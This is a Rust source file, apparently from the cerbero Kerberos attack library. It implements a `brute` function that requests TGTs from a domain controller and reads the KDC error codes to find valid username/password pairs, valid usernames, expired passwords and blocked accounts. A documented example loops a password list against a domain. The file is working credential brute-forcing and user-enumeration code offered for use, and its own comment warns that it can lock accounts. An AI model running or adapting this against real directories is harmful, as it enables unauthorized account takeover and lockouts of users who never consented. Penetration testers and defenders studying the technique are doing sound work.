use crate::{
	communication::KrbChannel,
	core::{request_tgt, BruteResult, KrbUser},
	error::{Error, Result},
};
use kerberos_constants::error_codes;
use kerberos_crypto::Key;

/// Perform TGT requests in order to discover user credentials based on the KDC response
///
/// WARNING: This attack should be performed carefully since it can block user accounts
///
/// This brute force technique allows you to discover:
/// Valid username/password pairs, Valid usernames, Expired passwords, Blocked or disabled users
///
/// # Examples
///
/// ```
/// use cerbero_lib::{brute, BruteResult, KdcComm, Kdcs, TransportProtocol};
/// use std::net::{IpAddr, Ipv4Addr};
///
/// fn main()
/// {
///    let mut kdcs = Kdcs::new();
///    let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
///    kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);
///
///    let mut kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);
///
///    let passwords = ["password1", "password2"];
///
///    match kdccomm.create_channel("DOMAIN.COM")
///    {
///       Ok(channel) =>
///       {
///          for password in passwords.iter()
///          {
///             match brute("DOMAIN.COM", "Username".to_string(), password.to_string(), channel.as_ref())
///             {
///                Ok(result) => match result
///                {
///                   BruteResult::ValidPair(username, password) =>
///                   {
///                      println!("Valid User \"{}\" with Password \"{}\"", username, password)
///                   },
///                   BruteResult::InvalidUser(username) =>
///                   {
///                      println!("Invalid User \"{}\"", username)
///                   },
///                   BruteResult::ValidUser(username) =>
///                   {
///                      println!("Valid User \"{}\"", username)
///                   },
///                   BruteResult::ExpiredPassword(username, password) =>
///                   {
///                      println!("Valid User \"{}\" with Expired Password \"{}\"", username, password)
///                   },
///                   BruteResult::BlockedUser(username) =>
///                   {
///                      println!("Blocked User \"{}\"", username)
///                   },
///                },
///                Err(e) => panic!("Failed to brute force the KDC: {}", e),
///             }
///          }
///       },
///       Err(e) => panic!("Failed to create a channel to the KDC: {}", e),
///    }
/// }
/// ```

pub fn brute(realm: &str, username: String, password: String, channel: &dyn KrbChannel) -> Result<BruteResult>
{
	let user = KrbUser::new(username.clone(), realm.to_string());
	let user_key = Key::Secret(password.clone());

	match request_tgt(user, &user_key, None, &*channel)
	{
		Ok(_) => Ok(BruteResult::ValidPair(username.clone(), password.clone())),
		Err(e) => match e
		{
			Error::KrbError(krb_error) if krb_error.error_code == error_codes::KDC_ERR_C_PRINCIPAL_UNKNOWN =>
			{
				Ok(BruteResult::InvalidUser(username.clone()))
			},
			Error::KrbError(krb_error) if krb_error.error_code == error_codes::KDC_ERR_PREAUTH_FAILED =>
			{
				Ok(BruteResult::ValidUser(username.clone()))
			},
			Error::KrbError(krb_error) if krb_error.error_code == error_codes::KDC_ERR_KEY_EXPIRED =>
			{
				Ok(BruteResult::ExpiredPassword(username.clone(), password.clone()))
			},
			Error::KrbError(krb_error) if krb_error.error_code == error_codes::KDC_ERR_CLIENT_REVOKED =>
			{
				Ok(BruteResult::BlockedUser(username.clone()))
			},
			e => Err(e),
		},
	}
}
